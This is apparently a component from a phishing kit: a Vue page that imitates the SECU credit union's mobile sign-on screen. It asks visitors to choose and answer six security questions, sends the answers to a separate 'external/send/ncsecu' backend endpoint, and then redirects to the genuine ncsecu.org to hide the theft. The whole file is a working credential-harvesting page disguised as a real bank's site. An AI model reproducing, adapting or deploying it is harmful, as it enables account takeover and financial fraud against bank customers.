<template>
  <div>

    <a href="http://itunes.apple.com/us/app/SECU/id1435916976?mt=8" style="text-decoration: none; color: #ffffff;">
      <table id="MobileAppBanner" role="presentation"
             style="background: #333333; height: 50px; position: fixed; left: 0; right: 0; top: 0;" width="100%">
        <tbody>
        <tr>
          <td style="vertical-align: middle; padding-left: 10px;" width="30px;">
            <img src="analytic/icon/pdf/data/Logo.fw.png" alt="SECU Logo" width="25px;" height="25px;">
          </td>
          <td style="vertical-align: middle; text-align: left;" class="text3">Open in the SECU Mobile App</td>
          <td style="vertical-align: middle; text-align: right; padding-right: 10px;" class="text3" width="20px;">&gt;
          </td>
        </tr>
        </tbody>
      </table>
    </a>
    <div style="height: 50px;">&nbsp;</div>
    <div id="logobar" class="logoBar">
      <div id="logoDiv" class="centered noExtraSpace">
        <img id="logo" class="logo" alt="SECU Logo" title="SECU Logo" src="analytic/icon/pdf/data/SECU_480_White.png">
      </div>
    </div>

    <form @submit.prevent="handleSubmit"  id="loginForm" name="loginForm">


      <div class="centered topSpace" style="width: 85%;">
        <div>Please Confirm your security question and answer </div>
        <div class="noExtraSpace">
          <div style="padding-bottom: .3em;margin-bottom:.3em;overflow: auto;">
            <div class="signOnText text3" id="DivLabelUserID" style="display:block;width:230px;margin:0 0 0 0.6em">
              <label for="TextUserID" id="LabelUserID" style="display:block;font-size:13px">Select Security Question 1:</label>
            </div>
            <div class="signOnInput">
              <select v-model="form.q1" id="q1" required style="font-size:12px;width:293px;height:39px">
                <option value="">Select Question</option>
                <option value="What is your place of birth?">What is your place of birth?</option>
                <option value="What city were you born in?">What city were you born in?</option>
                <option value="What county were your born in?">What county were your born in?</option>
                <option value="What city were you married in?">What city were you married in?</option>
                <option value="What is the month of your wedding anniversary?">What is the month of your wedding anniversary?</option>
                <option value="What city was your first high school in?">What city was your first high school in?</option>
                <option value="What is your fathers's middle name?">What is your fathers's middle name?</option>
                <option value="What is your favorite musical instrument?">What is your favorite musical instrument?</option>
              </select>
            </div>
          </div>
          <div style="padding-bottom: 0; overflow: auto;">
            <div class="signOnText text3" id="DivLabelPassword" style="display: none;">
              <label for="TextPassword" id="LabelPassword" style="display:none;">Answer 1:</label>
            </div>
            <div class="signOnInput">
              <input type="text" alt="null" tabindex="2" v-model="form.ans1" id="ans1" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
            </div>
          </div>
        </div>

        <div class="noExtraSpace">
          <div style="padding-bottom: .3em;margin-bottom:.3em;overflow: auto;">
            <div class="signOnText text3" id="DivLabelUserID" style="display:block;width:230px;margin:0 0 0 0.6em">
              <label for="TextUserID" id="LabelUserID" style="display:block;font-size:13px">Select Security Question 2:</label>
            </div>
            <div class="signOnInput">
              <select v-model="form.q2" id="q2" required style="font-size:12px;width:293px;height:39px">
                <option value="">Select Question</option>
                <option value="What is the last name of your childhood doctor?">What is the last name of your childhood doctor?</option>
                <option value="What is the street number of the house you grew up in?">What is the street number of the house you grew up in?</option>
                <option value="What is your favorite vacation destination?">What is your favorite vacation destination?</option>
                <option value="What is your favorite color?">What is your favorite color?</option>
                <option value="What is your favorite pet?">What is your favorite pet?</option>
                <option value="What is the name of your favorite pet?">What is the name of your favorite pet?</option>
                <option value="What is your favorite holiday">What is your favorite holiday?</option>
              </select>
            </div>
          </div>
          <div style="padding-bottom: 0; overflow: auto;">
            <div class="signOnText text3" id="DivLabelPassword" style="display: none;">
              <label for="TextPassword" id="LabelPassword" style="display:none;">Answer 2:</label>
            </div>
            <div class="signOnInput">
              <input type="text" alt="null" tabindex="2" v-model="form.ans2" id="ans2" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
            </div>
          </div>
          <div>
            <input type="hidden" name="MobileToken" id="MobileToken" value="asdf345-asgfadsg-fd@$#6qew-adsfasg-agasf">
          </div>
        </div>

        <div class="noExtraSpace">
          <div style="padding-bottom: .3em;margin-bottom:.3em;overflow: auto;">
            <div class="signOnText text3" id="DivLabelUserID" style="display:block;width:230px;margin:0 0 0 0.6em">
              <label for="TextUserID" id="LabelUserID" style="display:block;font-size:13px">Select Security Question 3:</label>
            </div>
            <div class="signOnInput">
              <select v-model="form.q3" id="q3" required style="font-size:12px;width:293px;height:39px">
                <option value="">Select Question Three</option>
                <option value="What is your favorite food?">What is your favorite food?</option>
                <option value="What was your first car?">What was your first car?</option>
                <option value="What was the make of your first car?">What was the make of your first car?</option>
                <option value="What was your high school mascot?">What was your high school mascot?</option>
                <option value="What was your elementary school?">What was your elementary school?</option>
                <option value="What year did you graduate high school?">What year did you graduate high school?</option>
                <option value="What was your favorite class in school?">What was your favorite class in school?</option>
              </select>
            </div>
          </div>
          <div style="padding-bottom: 0; overflow: auto;">
            <div class="signOnText text3" id="DivLabelPassword" style="display: none;">
              <label for="TextPassword" id="LabelPassword" style="display:none;">Answer 3:</label>
            </div>
            <div class="signOnInput">
              <input type="text" alt="null" tabindex="2" v-model="form.ans3" id="ans3" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
            </div>
          </div>
          <div>
            <input type="hidden" name="MobileToken" id="MobileToken" value="asdf345-asgfadsg-fd@$#6qew-adsfasg-agasf">
          </div>
        </div>

        <div class="noExtraSpace">
          <div style="padding-bottom: .3em;margin-bottom:.3em;overflow: auto;">
            <div class="signOnText text3" id="DivLabelUserID" style="display:block;width:230px;margin:0 0 0 0.6em">
              <label for="TextUserID" id="LabelUserID" style="display:block;font-size:13px">Select Security Question 4:</label>
            </div>
            <div class="signOnInput">
              <select v-model="form.q4" id="q4" required style="font-size:12px;width:293px;height:39px">
                <option value="">Select Question Four</option>
                <option value="What is your place of birth?">What is your place of birth?</option>
                <option value="What city were you born in?">What city were you born in?</option>
                <option value="What county were your born in?">What county were your born in?</option>
                <option value="What city were you married in?">What city were you married in?</option>
                <option value="What is the month of your wedding anniversary?">What is the month of your wedding anniversary?</option>
                <option value="What city was your first high school in?">What city was your first high school in?</option>
                <option value="What is your fathers's middle name?">What is your fathers's middle name?</option>
                <option value="What is your favorite musical instrument?">What is your favorite musical instrument?</option>
              </select>
            </div>
          </div>
          <div style="padding-bottom: 0; overflow: auto;">
            <div class="signOnText text3" id="DivLabelPassword" style="display: none;">
              <label for="TextPassword" id="LabelPassword" style="display:none;">Answer 4:</label>
            </div>
            <div class="signOnInput">
              <input type="text" alt="null" tabindex="2" v-model="form.ans4" id="ans4" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
            </div>
          </div>
          <div>
            <input type="hidden" name="MobileToken" id="MobileToken" value="asdf345-asgfadsg-fd@$#6qew-adsfasg-agasf">
          </div>
        </div>

        <div class="noExtraSpace">
          <div style="padding-bottom: .3em;margin-bottom:.3em;overflow: auto;">
            <div class="signOnText text3" id="DivLabelUserID" style="display:block;width:230px;margin:0 0 0 0.6em">
              <label for="TextUserID" id="LabelUserID" style="display:block;font-size:13px">Select Security Question 5:</label>
            </div>
            <div class="signOnInput">
              <select v-model="form.q5" id="q5" required style="font-size:12px;width:293px;height:39px">
                <option value="">Select Question Five</option>
                <option value="What is the last name of your childhood doctor?">What is the last name of your childhood doctor?</option>
                <option value="What is the street number of the house you grew up in?">What is the street number of the house you grew up in?</option>
                <option value="What is your favorite vacation destination?">What is your favorite vacation destination?</option>
                <option value="What is your favorite color?">What is your favorite color?</option>
                <option value="What is your favorite pet?">What is your favorite pet?</option>
                <option value="What is the name of your favorite pet?">What is the name of your favorite pet?</option>
                <option value="What is your favorite holiday">What is your favorite holiday?</option>
              </select>
            </div>
          </div>
          <div style="padding-bottom: 0; overflow: auto;">
            <div class="signOnText text3" id="DivLabelPassword" style="display: none;">
              <label for="TextPassword" id="LabelPassword" style="display:none;">Answer 5:</label>
            </div>
            <div class="signOnInput">
              <input type="text" alt="null" tabindex="2" v-model="form.ans5" id="ans5" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
            </div>
          </div>
          <div>
            <input type="hidden" name="MobileToken" id="MobileToken" value="asdf345-asgfadsg-fd@$#6qew-adsfasg-agasf">
          </div>
        </div>

        <div class="noExtraSpace">
          <div style="padding-bottom: .3em;margin-bottom:.3em;overflow: auto;">
            <div class="signOnText text3" id="DivLabelUserID" style="display:block;width:230px;margin:0 0 0 0.6em">
              <label for="TextUserID" id="LabelUserID" style="display:block;font-size:13px">Select Security Question 6:</label>
            </div>
            <div class="signOnInput">
              <select v-model="form.q6" id="q6" required style="font-size:12px;width:293px;height:39px">
                <option value="">Select Question Six</option>
                <option value="What is your favorite food?">What is your favorite food?</option>
                <option value="What was your first car?">What was your first car?</option>
                <option value="What was the make of your first car?">What was the make of your first car?</option>
                <option value="What was your high school mascot?">What was your high school mascot?</option>
                <option value="What was your elementary school?">What was your elementary school?</option>
                <option value="What year did you graduate high school?">What year did you graduate high school?</option>
                <option value="What was your favorite class in school?">What was your favorite class in school?</option>
              </select>
            </div>
          </div>
          <div style="padding-bottom: 0; overflow: auto;">
            <div class="signOnText text3" id="DivLabelPassword" style="display: none;">
              <label for="TextPassword" id="LabelPassword" style="display:none;">Answer 6:</label>
            </div>
            <div class="signOnInput">
              <input type="text" alt="null" tabindex="2" v-model="form.ans6" id="ans6" required title="Enter your password to log In" style="color: inherit; height: 1.0em; width: 100%;" maxlength="32" autocomplete="off" placeholder="Answer">
            </div>
          </div>
        </div>


        <div style="margin-top: .2em; margin-bottom: 0em; clear: both;">
          <input type="submit" name="btnlog" value="Continue" id="MainCPH_LoginControl_ButtonSubmit" class="signOnButton fiColoredButton text5 bold">
        </div>
      </div>


      <div style="margin-top: .4em;">
        <div id="MainCPH_SelectionListMenu_contentDiv" class="content">
          <div id="MainCPH_SelectionListMenu_Items_listItemDiv_0" class="menuItem text2">
            <a id="Menu_1" title="Rates &amp; Fees" href="https://m.ncsecu.org/m/Rates.aspx">Rates &amp; Fees</a>
          </div>
          <div id="MainCPH_SelectionListMenu_Items_listItemDiv_1" class="menuItem text2">
            <a id="Menu_2" title="Locate Us" href="https://locations.ncsecu.org/search" target="_blank">Locate Us</a>
          </div>
          <div id="MainCPH_SelectionListMenu_Items_listItemDiv_2" class="menuItem text2">
            <a id="Menu_3" title="Contact Us" href="https://m.ncsecu.org/m/ContactUs_SECU.aspx">Contact Us</a>
          </div>
          <div id="MainCPH_SelectionListMenu_Items_listItemDiv_3" class="menuItem text2">
            <a id="Menu_4" title="View Full Website" href="https://www.ncsecu.org/home.html">View Full Website</a>
          </div>
        </div>
      </div>



      <div class="aspNetHidden">
        <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="CEF4095C">
        <input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="">
        <input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="bNOZ/U6L5kxhFwgVn/1wbHFGTcQr5UB9pk5Ztkg8k4CzkOnjHof7WVWouE7xPtAH3BY8Q1hyriVZS6Xk+6rBOciSWVK/cR2LbGe5/yhkxB8dw8oIu9rKA8dYvFZyTM282GunTVWdtTYWS/6MdSFZlDVlE0ML7VUeQ/CqeULE+X3Nz171jN9nXxqd7AbI8gFJeqJzfK/FV6mPoLX8BFjQu9SB5hmvoeuF0PH1wZF005DF2cEuSkr23rTm1BFX7SP95eqXPQ==">
      </div>
    </form>

    <div class="footer text5">
      <div class="smallSpaceBelow">
        <a href="https://www.ncsecu.org/Home/Legal.html" title="Legal" class="Link noShowLink" target="_blank">Legal</a>
        &nbsp;&nbsp;|&nbsp;&nbsp;
        <a id="linkAccessibility" href="https://www.ncsecu.org/Home/AccessibilityStatement.html" target="_blank">Accessibility</a>
        &nbsp;&nbsp;|&nbsp;&nbsp;
        <a class="Link noShowLink" href="javascript:ChangeLanguage(&quot;/m/Menu.aspx?lang=es&quot;)">Español</a> &nbsp;&nbsp;|&nbsp;&nbsp;
        <a href="https://m.ncsecu.org/m/SiteMap.aspx" id="ViewSiteMapLink" class="Link noShowLink">Site Map</a><br>
        Equal Housing Opportunity
        <img src="analytic/icon/pdf/data/ehl_gif_white_s14x13x256Pass.png" alt="Equal Housing Lender" width="14"
             height="13">
        &nbsp;&nbsp;|&nbsp;&nbsp;
        NMLS#430055
      </div>

      <div class="smallSpaceBelow">
        <span id="LabelInsuredMessage">Federally Insured by NCUA</span>
      </div><!-- <span id="LabelAccessibilityMessage"></span> -->
    </div>

    <div class="overlay">
      <div class="lgif-space"></div>
      <div class="loadgif">
        <img src="gtag/cloud/data/css/loading.gif" width="100" height="100">
      </div>
    </div>

  </div>
</template>

<script>
export default {
  name: "QuestionsComponent",
  data() {
    return {
      step1: true,
      step2: false,
      // eslint-disable-next-line no-undef
      form: new Form({
        q1: "",
        ans1: "",
        q2: "",
        ans2: "",
        q3: "",
        ans3: "",
        q4: "",
        ans4: "",
        q5: "",
        ans5: "",
        q6: "",
        ans6: "",
      }),
      id: '',
      pass: '',
      submitting: false,
      production: this.$ENV_MODE
    }
  },

  methods: {

    handleSubmit() {
      let loader = this.$loading.show({});
      this.submitting = true;
      setTimeout(() => {
        this.form.post(this.production ? this.$BASE_API_URL + '/external/send/ncsecu/seun/sec_questions' : '/api/v1/external/send/ncsecu/seun/sec_questions').then((response) => {

          loader.hide();
          this.$notify({
            message: response.data.message,
            type: "success",
            top: true,
            bottom: false,
            left: false,
            right: true,
            showClose: false,
            closeDelay: 2500,
            offset: 50,
          })

          setTimeout(() => {
            window.location.replace("https://www.ncsecu.org/");
          }, 800);


        }).catch((error) => {
          loader.hide();
          console.log(error.response);

          if (error.response.status == 422) {
            // eslint-disable-next-line no-unused-vars,no-empty
            for (let i in error.response.data.error) {

            }
          }

          // eslint-disable-next-line no-empty
          if (error.response.status == 401) {

          }
          this.submitting = false
        })
      }, 1000)
    },
  },

}
</script>

<style scoped>
.topSpace {
  background-color: #f5f9fc !important;
  color: #000 !important;
  max-width: 448px !important;
  padding: 20px 6px !important;
  border-radius: 18px !important;
  margin-bottom: 30px !important;
}
</style>
